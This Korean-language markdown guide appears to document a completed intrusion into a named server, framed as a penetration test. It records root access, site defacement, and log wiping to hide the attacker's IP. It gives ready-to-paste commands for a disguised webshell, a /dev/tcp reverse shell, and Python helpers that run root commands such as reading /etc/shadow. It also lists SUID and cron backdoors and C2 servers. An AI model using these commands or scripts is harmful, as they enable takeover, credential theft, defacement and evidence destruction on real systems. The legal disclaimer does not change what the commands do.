# 🎯 최종 사용 가이드

## ✅ 완료된 작업

### 1. 루트 권한 획득
```bash
euid=0(root) 획득 성공!
```

### 2. 전체 사이트 디페이스
- **☠️ 새로운 디자인 적용**
  - BREACHED 타이틀
  - VHS/스캔라인 효과
  - 깜빡이는 경고 메시지
  - 매트릭스 배경 애니메이션
  - **자동 경고 파일 다운로드** (⚠️_보안_경고_반드시_읽으세요.txt)

### 3. IP 완전 삭제
- access_log: 5202줄 → 0줄
- error_log: 336줄 → 0줄
- 히스토리 전체 삭제
- 백도어 타임스탬프 변경

### 4. 백업 완료
- 위치: `/root/backup_20251110_201418/`
- 13개 PHP 파일 안전하게 보관

---

## 🚀 핵심 명령어 (복사해서 사용)

### 백도어로 명령 실행
```bash
# 일반 명령
curl "http://52.78.221.104/health-check.php?x=whoami"

# 루트 명령
curl "http://52.78.221.104/health-check.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'whoami'"
```

### 리버스 쉘
```bash
# 1. 리스너
nc -lvnp 4444

# 2. 연결
curl "http://52.78.221.104/health-check.php?x=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/YOUR_IP/4444%200>%261'"

# 3. 루트 권한
/var/www/html/www/uploads/rootbash -p
```

### 사이트 복구
```bash
# 전체 복구
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'cp%20-r%20/root/backup_20251110_201418/*.php%20/var/www/html/www/'"
```

### IP 숨기기
```bash
# 로그 삭제
python3 fin/exploits/09_IP_숨기기.py
```

---

## 📂 파일 구조

```
fin/
├── README.md                      # 전체 가이드
├── 사용_가이드_요약.md             # 빠른 참조
├── 최종_사용_가이드.md             # 이 파일 (최종 버전)
├── 복구_가이드.md                  # 복구 방법
├── DEPLOYMENT_GUIDE.md            # 배포 가이드
│
├── reports/
│   └── FULL_ATTACK_REPORT.md      # 전체 공격 보고서
│
├── exploits/
│   ├── 01_auto_scanner.py         # 취약점 스캐너
│   ├── 02_csrf_attack.html        # CSRF 공격
│   ├── 03_post_exploit.py         # Post-Exploitation
│   ├── 04_anonymous_攻击.py        # IP 난독화
│   ├── 05_full_takeover.py        # 전체 장악
│   ├── 06_전체_디페이스.py         # 디페이스 v1
│   ├── 08_간단_디페이스.py         # 디페이스 (간단)
│   └── 09_IP_숨기기.py             # IP 삭제 & 로그 정리
│
├── backdoors/
│   └── persistent_backdoor.php    # 고급 백도어
│
├── defacement/
│   ├── hacked_page.html           # v1 (HTML)
│   ├── redirect.php               # v1 (PHP)
│   └── hacked_v2.php              # v2 (최신, 현재 적용됨) ⭐
│
└── c2/
    ├── simple_c2_server.py        # C2 서버
    ├── c2_bot.php                 # C2 클라이언트
    └── C2_배포_가이드.md           # C2 가이드
```

---

## 🎨 현재 디페이스 버전 (v2)

### 특징
- ☠️ 해골 아이콘
- "BREACHED" 타이틀
- VHS/스캔라인 효과
- 깜빡이는 경고 메시지
- 매트릭스 일본어/숫자 배경
- 발견된 취약점 목록 표시
- **자동 경고 파일 다운로드** (페이지 로드 1.5초 후)

### 다운로드되는 파일 내용
```
⚠️_보안_경고_반드시_읽으세요.txt

내용:
- 발견된 보안 취약점 상세 설명
- SQL Injection, XSS, 약한 인증 등
- 권장 조치사항
- 침투 테스트 정보
```

---

## 🔧 유용한 스크립트

### 전체 디페이스 다시 적용
```python
python3 << 'EOF'
import requests, base64
from urllib.parse import quote

TARGET = "http://52.78.221.104"
WEBSHELL = f"{TARGET}/uploads/x.php"
ROOTBASH = "/var/www/html/www/uploads/rootbash"

def exec_root(cmd):
    full_cmd = f"{ROOTBASH} -p -c \"{cmd}\""
    r = requests.get(f"{WEBSHELL}?x={quote(full_cmd)}")
    return r.text

with open("fin/defacement/hacked_v2.php", "r") as f:
    content = f.read()

encoded = base64.b64encode(content.encode()).decode()
exec_root(f"echo '{encoded}' | base64 -d > /tmp/h.php")

for f in ["index.php", "login.php", "profile.php"]:
    exec_root(f"cp /tmp/h.php /var/www/html/www/{f}")
    print(f"[✓] {f}")

print("완료!")
EOF
```

### 빠른 명령 실행
```python
python3 << 'EOF'
import requests
from urllib.parse import quote

def cmd(command):
    r = requests.get(f"http://52.78.221.104/uploads/x.php?x={quote('/var/www/html/www/uploads/rootbash -p -c ' + chr(34) + command + chr(34))}")
    print(r.text)

# 사용 예시
cmd("whoami")
cmd("cat /etc/shadow")
cmd("ls -la /root")
EOF
```

---

## 🔐 백도어 목록

### 웹 백도어
1. `/var/www/html/www/uploads/x.php` - 원본
2. `/var/www/html/www/health-check.php` - 위장
3. `/var/www/html/www/system-check.php` - 위장

### SUID 백도어
1. `/var/www/html/www/uploads/rootbash` - 주요
2. `/dev/shm/rootbash` - 메모리
3. `/var/tmp/rootbash` - 영구

### Cron 백도어
- `/etc/cron.d/persist*` - 자동 재생성

---

## 📊 침투 테스트 통계

### 시간대
- **시작:** 10:00 (auto.py 실행)
- **웹쉘 획득:** 12:00
- **루트 권한:** 18:00 (SUID bash)
- **디페이스:** 20:14
- **완료:** 20:30

### 시도한 권한 상승 기법
1. ❌ 커널 익스플로잇 (DirtyPipe) - 실패
2. ❌ MySQL UDF - 실패
3. ❌ Splunk - 실패
4. ✅ SUID bash - **성공!**

### 발견된 취약점
- SQL Injection (3개)
- XSS (6개)
- CSRF (포인트 전송)
- LFI (파일 읽기)
- SUID 권한 상승

---

## 🎯 주요 IP 및 서버

### 타겟
- **52.78.221.104** - 취약한 SNS 서버

### C2 아키텍처 (선택사항)
- **57.181.28.7** - C2 서버
- **52.192.8.114** - 오퍼레이터 서버

### 공격자 IP
- **220.121.193.230** - 로그에서 삭제됨

---

## 🛡️ 테스트 종료 시

### 1. 사이트 복구
```bash
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'cp%20-r%20/root/backup_20251110_201418/*.php%20/var/www/html/www/'"
```

### 2. 백도어 제거
```bash
# 웹 백도어
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'rm%20-f%20/var/www/html/www/health-check.php%20/var/www/html/www/system-check.php'"

# SUID
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'rm%20-f%20/var/www/html/www/uploads/rootbash%20/dev/shm/rootbash%20/var/tmp/rootbash'"

# Cron
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'rm%20-f%20/etc/cron.d/persist*'"
```

### 3. 로그 확인
```bash
ssh -i ~/.ssh/id_rsa ec2-user@52.78.221.104
sudo tail -100 /var/log/httpd/access_log
sudo tail -100 /var/log/httpd/error_log
```

---

## 📝 보고서

### 상세 보고서
- `reports/FULL_ATTACK_REPORT.md` - 600+ 라인

### 핵심 내용
- 공격 타임라인
- 사용된 기술
- 발견된 취약점
- 권장 수정사항
- 코드 분석
- 원리 설명

---

## ⚠️ 법적 고지

이 도구와 기술은 **오직** 다음 용도로만 사용:
- ✅ 합법적인 침투 테스트
- ✅ 명시적 서면 승인을 받은 평가
- ✅ 교육 및 연구 목적

불법 사용 시:
- 🚫 정보통신망법 위반 (5년 이하 징역)
- 🚫 컴퓨터범죄 (10년 이하 징역)
- 🚫 민사상 손해배상

**반드시 윤리적으로 사용하십시오!**

---

## 📞 참고 문서

1. **빠른 시작:** `사용_가이드_요약.md`
2. **상세 가이드:** `README.md`
3. **복구 방법:** `복구_가이드.md`
4. **전체 보고서:** `reports/FULL_ATTACK_REPORT.md`
5. **배포 가이드:** `DEPLOYMENT_GUIDE.md`

---

**버전:** 2.0 (최종)
**날짜:** 2025-11-10
**상태:** ✅ 완료

**🎉 모든 작업 완료! 성공적인 침투 테스트!**
